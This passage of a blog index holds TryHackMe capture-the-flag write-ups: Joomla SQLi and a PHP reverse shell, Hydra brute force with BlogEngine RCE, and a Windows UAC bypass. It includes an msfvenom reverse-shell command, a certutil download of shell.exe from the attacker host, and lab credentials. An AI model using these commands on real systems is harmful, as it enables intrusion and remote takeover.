,lets check them out\nI checked each of them and all the directories returned an empty page except /administrator\nSo , now we have a Joomla login page but we have no valid creds.\nI viewed the source code to see whether we could find the version of joomla running here but couldn\u0026rsquo;t find anything. Wappalyzer didn\u0026rsquo;t reveal much info about the version either ü§î.\ncmseek Runnning a tool called cmseekwhich is basically a cms vulnerability scanner gave the version of Joomla cms that is running here\nTask 2 : What is the Joomla version?\nAnswer - 3.7.0\nFoothold - Since Tryhackme tells us to use a python script from github rather than using sqlmap, I googled for this CVE-2017-8917 exploit .And I got one straight away\nYou can find the exploit here üëâüèª https://github.com/stefanlucas/Exploit-Joomla/blob/master/joomblah.py\nLet\u0026rsquo;s run the script using python2\nNow we have a password hash for the user Jonah !\nhashid First we need to find what kind of hashing algorithm is used, lets run hashid\njohn the ripper So it tells us that it is bcrypt.Now lets crack it using JTR\nNOTE - It will take nearly 7 minutes for john to crack this password hash\nAnd now we have Jonah\u0026rsquo;s password\nTask 2 : What is Jonah\u0026rsquo;s cracked password?\nspi******123\nLets now login to that webpage we saw earlier\nReverse shell And We are in ! After some manual enumeration , I was able to edit the index.php file of one of the templates with pentest monkey\u0026rsquo;s PHP reverse shell script to get a reverse shell\nTo trigger the exploit , just click the Template preview button to get a reverse shell back to your machine .\nAnd finally we are in as the apache user !\nShell as JJameson - First things first , lets check what users are on the system\nThere are two users - root \u0026amp;** jjameson**\nTime to do some priv-esc. I quickly transferred ** Linpeas ** to the target machine and ran it.\nOne particular thing stood out üëáüèª\nIt seems like password for jjameson , let\u0026rsquo;s try to switch user as jjameson \u0026amp; it works !\nGrab the user.txt üö©\nTask 3 : What is the user flag?\nAnswer - 27a260fe3********d80442e\nShell as root - So its time to priv-esc to rootüßê\nRunning sudo -l , we come to know that we could run yum binary as root .\nI quickly looked at ** GTFOBINS for any sudo misconfiguration in yum binary** to help us escalate our privileges to root .\nRun the following snippet as shown in GTFOBINS to obtain root üëë !\nGrab the root.txt üö©\nTask 2: What is the root flag?\nAnswer - eec3d53****fa6f79\n","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/dailybugle/","summary":"Description - Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum . Hack into the machine and obtain the root user\u0026rsquo;s credentials.\n**Room name ** Daily Bugle **OS ** Linux **Difficulty ** Hard **Room Link ** https://tryhackme.com/room/dailybugle **Creator ** Tryhackme Enumeration - Portscan ‚ûú dailybugle rustscan -a 10.10.164.206 --range 0-65535 -- -sV -sC -v -oN dailybugle.nmap # Nmap 7.91 scan initiated Sun Sep 5 10:04:00 2021 as: nmap -vvv -p 22,80,3306 -sV -sC -v -oN dailybugle.","title":"Daily Bugle - THM"},{"content":"Description - Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!\nRoom name HackPark OS Windows Difficulty Medium Room Link https://tryhackme.com/room/hackpark Creator Tryhackme Enumeration - nmap ‚îå‚îÄ‚îÄ(shebu„âøkali)-[~/thm/hackpark] ‚îî‚îÄ$rustscan -a 10.10.253.78 --range 0-65535 -- -sV -sV -oN hackpark.nmap # Nmap 7.91 scan initiated Fri Sep 24 10:37:00 2021 as: nmap -vvv -p 80,3389 -sV -sC -v -oN hackpark.nmap 10.10.30.95 Nmap scan report for 10.10.30.95 Host is up, received syn-ack (0.70s latency). Scanned at 2021-09-24 10:37:01 EDT for 28s PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Microsoft IIS httpd 8.5 | http-methods: | Supported Methods: GET HEAD OPTIONS TRACE POST |_ Potentially risky methods: TRACE | http-robots.txt: 6 disallowed entries | /Account/*.* /search /search.aspx /error404.aspx |_/archive /archive.aspx |_http-server-header: Microsoft-IIS/8.5 |_http-title: hackpark | hackpark amusements 3389/tcp open ssl/ms-wbt-server? syn-ack | ssl-cert: Subject: commonName=hackpark | Issuer: commonName=hackpark | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2021-09-23T14:29:32 | Not valid after: 2022-03-25T14:29:32 | MD5: d2d4 425f 7c21 ad81 a68a dc87 3dac 86a6 | SHA-1: e48f 524a 5059 28a3 1ac9 5b85 a200 b6b4 7c4d 3ba7 | -----BEGIN CERTIFICATE----- | MIIC1DCCAbygAwIBAgIQHkBfS+k/moVJ3+968HFmATANBgkqhkiG9w0BAQUFADAT | MREwDwYDVQQDEwhoYWNrcGFyazAeFw0yMTA5MjMxNDI5MzJaFw0yMjAzMjUxNDI5 | MzJaMBMxETAPBgNVBAMTCGhhY2twYXJrMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A | MIIBCgKCAQEAwuNKsVemOogwCY99oGULczMgMJIxd0iNtJKaqBFItWdTkeWsWKEy | qeBFbXV9Y7s4O+CrYyQyyE+CxmKmR+A2/TAPgVTMwfjKsxjP0u3lVt0rJzJSp0Hf | w5wMkesAjte6dCHOtY3kcXTzuMFbGNAmmAO8LXhQppVBoxchMdP3zcMQbw6kqkxA | ID7HHCkIQtlsHEcgkgDZVYdL4/rn+ohTxFPcEOWeNDXMMTkjCz4BYL1rRa761Nr1 | Ydtg91V9rfCxLNNq5HwcHX8lLMnnNh6Y+BHftIjVFYeaLG7hqY4nHLd537Fk6boN | 80lg08VY4AkxVVbWhDZ8qDyL3X8lMqdblwIDAQABoyQwIjATBgNVHSUEDDAKBggr | BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQEFBQADggEBAISdX39FnLL9 | RyosCQvLDaj6w82nlKtCjEyEWqLMziueX/TzueeEJ00KbabgtHepW44WsE9ZyZJq | jvGqkjYsfXdAckVZFPOHwyM3FpxF6lhGaYVVdMiZrBdMfvOMTNHXpyK9uG8g5Dun | BPk+1z/25lO9DEOdFRHFHagbC2mf9shwWt9dDIUfVNBg5sFYFNNUo+WNJxsDVEP6 | 8C3Oi1E6Bpj7LGUrodc0kdIbVdgh+VXJW1OJEiLK/G208feHIyYvG7Mh9Jgk6g6q | /hWv/T3d/fjelncL12dKIU/NodsLQ4uqknZolHfCXbIE7ME5i0HEVTJ3cL3Fh8PX | 1g871ab1pXY= |_-----END CERTIFICATE----- |_ssl-date: 2021-09-24T14:36:21+00:00; -1m06s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -1m06s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 24 10:37:29 2021 -- 1 IP address (1 host up) scanned in 28.75 seconds There are 2 ports open :\nPort 80 - http - Microsoft IIS httpd 8.5\nPort 3389 - RDP - Microsoft WBT Server\nWeb enumeration Visiting the website at port 80 gives us this page\nAs per our map scan there are few disallowed entries in robots.txt,let\u0026rsquo;s check it out\nAll of them returned 403 but /archive gave us this page but it didn\u0026rsquo;t contain any interesting stuff\nThe options tab in the home page we visited earlier had a login option,\nLet\u0026rsquo;s check it out\nHydra I tried all default usernames and passwords but nothing worked,so I decided to bruteforce the login form using hydra\nAnd it worked, now we have a username and password .Let\u0026rsquo;s log in !\nFoothold - The About section tells us the version of the BlogEngine being used here is 3.3.6.0\nLooking for exploits for this particular version in searchsploit reveals this,\nThere are 3 RCE exploits , lets try the first one. Before that we\u0026rsquo;ll mirror the exploit and examine it - searchsploit -m aspx/webapps/46353.cs The exploit tells us the steps we need to do inorder to gain a reverse shell back to our machine.\nHere\u0026rsquo;s what we need to do\n1.Rename the exploit as \u0026#34;PostView.ascx\u0026#34; 2.Change the IP and port in the exploit . 3.Log in to the application as admin. 4.Click Contents-\u0026gt;Posts-\u0026gt;Welcome to Hackpark title-\u0026gt;File Manager 5.Click on UPLOAD Upload the PostView.ascx and save it 6.Setup nc listener and visit http://\u0026lt;ip\u0026gt;/?theme=../../App_Data/files 7.The web page keeps on loading which means you\u0026#39;ve got a rev-shell back ! The shell is not stable so let\u0026rsquo;s create a msfvenom payload and upload it to the machine üëáüèª\n1.On our machine -\u0026gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.30.219 LPORT=4444 -f exe \u0026gt; shell.exe\n2.On victim machine, go to C:\\Users\\Public which is usually world writable directory and grab the msfvenom payload from our machine\n-\u0026gt; certutil.exe -urlcache -f http://10.11.30.219:8000/shell.exe shell.exe\n3.Execute shell.exe to get back a stable shell in msf .\nPrivilege Escalation - Running sysinfo tells us that we are on a 64-bit machine.\nThere are 2 users on the system - jeff and administrator\nI quickly transferred winpeas to the target machine and ran it\nThere were 2 way to priv-esc as admin user\nMethod 1 - Running winpeas tells us that we have permissions to modify the following system-scheduler service binary\nC:\\Program Files (x86)\\SystemScheduler - contains all the executables run by the scheduler.But we need to know which .exe is being executed by the systemscheduler.\nNOTE - Scheduler is similar to something like cron in Linux\nSo lets check the Events directory inside the SystemScheduler folder which contains the systemlog files. The 20198415519.INI_LOG.txt file contains the info we need! From the contents of the log file we could understand that the Message.exe is being run by administrator every 30 seconds.\nTo exploit this just follow the steps ,\n1.Rename Message.exe to Message.bak\n2.Move shell.exe which we previously used to gain a stable shell to this current directory C:\\Program Files (x86)\\SystemScheduler\n3.Rename shell.exe to Message.exe.\n4.Setup a netcat listener on our local machine and wait for 30 seconds to get a shell back as administrator !\nMethod 2 - Winpeas output gave us these credentials üëáüèª\nRemember ? We had port 3389 open which is RDP.\nLet\u0026rsquo;s try logging in using xfreerdp\nxfreerdp /u:administrator /v:10.10.176.92:3389 /cert:ignore /p:4q6XvFES7Fdxs Aaandd we\u0026rsquo;re in !\nGrab the user.txt üö©\nOpen command prompt, navigate C:\\Users\\jeff\\Desktop and grab the user flag Grab root.txt üö©\nroot.txt file is on the Desktop of admin user . ","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/hackpark/","summary":"Description - Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!\nRoom name HackPark OS Windows Difficulty Medium Room Link https://tryhackme.com/room/hackpark Creator Tryhackme Enumeration - nmap ‚îå‚îÄ‚îÄ(shebu„âøkali)-[~/thm/hackpark] ‚îî‚îÄ$rustscan -a 10.10.253.78 --range 0-65535 -- -sV -sV -oN hackpark.nmap # Nmap 7.91 scan initiated Fri Sep 24 10:37:00 2021 as: nmap -vvv -p 80,3389 -sV -sC -v -oN hackpark.nmap 10.10.30.95 Nmap scan report for 10.","title":"HackPark - THM"},{"content":"Description - New high score!\nThere are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work.\nRoom Retro OS Windows Difficulty Hard Room Link https://tryhackme.com/room/retro Creator DarkStar7471 Enumeration - Task 1 - Pwn\nNmap\n# Nmap 7.91 scan initiated Mon Aug 9 02:32:51 2021 as: nmap -sC -sV -v -p 80,3389 -oN retro.nmap retro.thm Nmap scan report for retro.thm (10.10.39.189) Host is up (0.22s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: RETROWEB | NetBIOS_Domain_Name: RETROWEB | NetBIOS_Computer_Name: RETROWEB | DNS_Domain_Name: RetroWeb | DNS_Computer_Name: RetroWeb | Product_Version: 10.0.14393 |_ System_Time: 2021-08-09T06:32:02+00:00 | ssl-cert: Subject: commonName=RetroWeb | Issuer: commonName=RetroWeb | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-08-08T06:21:24 | Not valid after: 2022-02-07T06:21:24 | MD5: 55a1 3e5f 9623 5cf0 be0e 8565 b1bb 00a5 |_SHA-1: a0cf f59d 1e77 e914 7eeb 810e b04d a310 dc2c c90e |_ssl-date: 2021-08-09T06:32:06+00:00; -1m00s from scanner time. Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -1m00s, deviation: 0s, median: -1m00s Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Aug 9 02:33:06 2021 -- 1 IP address (1 host up) scanned in 15.70 seconds As you can see there are 2 ports open :\nPort 80 - http - Microsoft IIS httpd 10.0\nPort 3389 - ms-wbt-server - Microsoft Terminal Services\nWeb Enumeration\nVisitinng the webpage at port 80, we get a default IIS page üëáüèª\nTo enumerate the hidden directories , I used ffuf\n‚îå‚îÄ‚îÄ(shebu„âøkali)-[~/Desktop/thm/retro] ‚îî‚îÄ$ ffuf -c -w /usr/share/wordlists/dirbuster/medium.txt -u http://retro.thm/FUZZ -fc 403,404 -fs 703 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive \u0026lt;3 ________________________________________________ :: Method : GET :: URL : http://retro.thm/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirbuster/medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403,404 :: Filter : Response size: 703 ________________________________________________ retro [Status: 301, Size: 146, Words: 9, Lines: 2] Qn 1 üéØ- What is the hidden directory which the website lives on? - /retro Shell as Wade - On visiting the /retro directory we get this webpage üëáüèª\nSeems like a fancy looking blog page .Taking a close look at the page , you can see that the author of the blog posts is Wade\nWade might possibly be a username which may come handy later .Lets note it down and enumerate further !\nWhile looking at all the posts ,one particular post is quite interesting üëáüèª\nThis posts has some comments on it !\nCould that be Wade\u0026rsquo;s password? Let\u0026rsquo;s try logging in using xfreerdp !\nxfreerdp /u:wade /p:parzival /cert:ignore /v:retro.thm And we\u0026rsquo;re in !!\nGrab the user.txtüö©\nShell as administrator - The first thing I checked was recycle bin , It contained hhupd.exe file .\nhhupd.exe is an executable file that is part of the Microsoft Press Computer-Lexikon program developed by Microsoft Press .\nThe next thing I noticed is there was Google Chrome shortcut in desktop which was weird !\nOpening Chrome , we could see that the author of the box has a bookmark called NVD-CVE-2019-1388\nMaybe this is what we need inorder to escalate out privileges to root ! So the CVE is CVE-2019-1388\nLets use some google fu to read more on this vulnerability ,\nThis blog post explains it in quite detailed and clear manner on how to exploit this vulnerability -\nhttps://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege\nFor this exploit to work we need to have hhupd.exe application on our system , which we already found in recycle bin .Restore the application and follow the steps as mentioned in the blog post .\n1. Run the \u0026#34;hhupd.exe\u0026#34; application as administrator 2. Click on \u0026#34;Show more details\u0026#34; arrow 3. Click the link \u0026#34;Show information about this publisher\u0026#39;s certificate\u0026#34; 4. Click the link \u0026#34;VeriSign Commercial Software Publishers CA\u0026#34; 5. Now the certificate issuer\u0026#39;s website should have been opened on internet explorer! 6. Press \u0026#34;CTRL+S\u0026#34; to save the webpage , a dialog box appears 7. Type \u0026#34;cmd.exe\u0026#34; on the File name box and hit ENTER ! Voila ! We get a command prompt with admin privileges ! Navigate to C:\\Users\\Administrator\\Desktop\nGrab the root.txt üö©\n","permalink":"https://sh3bu.github.io/themes/hugo-PaperMod/posts/retro/","summary":"Description - New high score!\nThere are two distinct paths that can be taken on Retro. One requires significantly less trial and error, however, both will work.\nRoom Retro OS Windows Difficulty Hard Room Link https://tryhackme.com/room/retro Creator DarkStar7471 Enumeration - Task 1 - Pwn\nNmap\n# Nmap 7.91 scan initiated Mon Aug 9 02:32:51 2021 as: nmap -sC -sV -v -p 80,3389 -oN retro.nmap retro.thm Nmap scan report for retro.thm (10.","title":"Retro - THM"}]